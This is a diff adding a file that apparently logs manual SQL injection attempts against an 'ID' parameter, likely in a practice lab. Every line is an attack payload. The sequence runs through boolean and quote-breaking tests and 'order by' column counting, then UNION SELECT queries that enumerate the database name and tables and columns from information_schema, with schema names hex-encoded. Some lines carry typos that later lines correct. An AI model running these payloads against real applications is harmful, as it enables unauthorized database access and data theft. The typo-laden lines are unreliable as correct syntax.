@@ -1,0 +1,32 @@
+ID:1
+ID:1 and 1=1
+ID:1 and 1=2
+ID:1 and 1=2
+ID:1'
+ID:1 order by 4
+ID:1 order by 5
+ID:1'order by 5
+ID:1'order by 3
+ID:9999 ororder by 3
+ID:9999 ororder by 1
+ID:9999 ororder by 4
+ID:'
+ID:
+ID:1')
+ID:1')order by 4
+ID:1')order by 4
+ID:1')order by 4
+ID:1')order by 4-- 
+ID:1')order by 3-- 
+ID:9999')union select 1,2,3-- 
+ID:9999')union select 1,2,3-- 
+ID:9999')union select 1,database(),3-- 
+ID:9999')union select 1,table_name,3 from 0x7365637572697479-- 
+ID:9999')union select 1,table_name,3 from security-- 
+ID:9999')union select 1,table_name,3 from informtaion_schema.tables where table_schema=0x7365637572697479-- 
+ID:9999')union select 1,table_name,3 from informataion_schema.tables where table_schema=0x7365637572697479-- 
+ID:9999')union select 1,table_name,3 from information_schema.tables where table_schema=0x7365637572697479-- 
+ID:9999')union select 1,colum_name,3 from information_schema.colums where colum_schema=0x656D61696C73-- 
+ID:9999')union select 1,column_name,3 from information_schema.columns where column_schema=0x656D61696C73-- 
+ID:9999')union select 1,column_name,3 from information_schema.columns where table_schema=0x656D61696C73-- 
+ID:9999')union select 1,column_name,3 from information_schema.columns where table_name=0x656D61696C73-- 
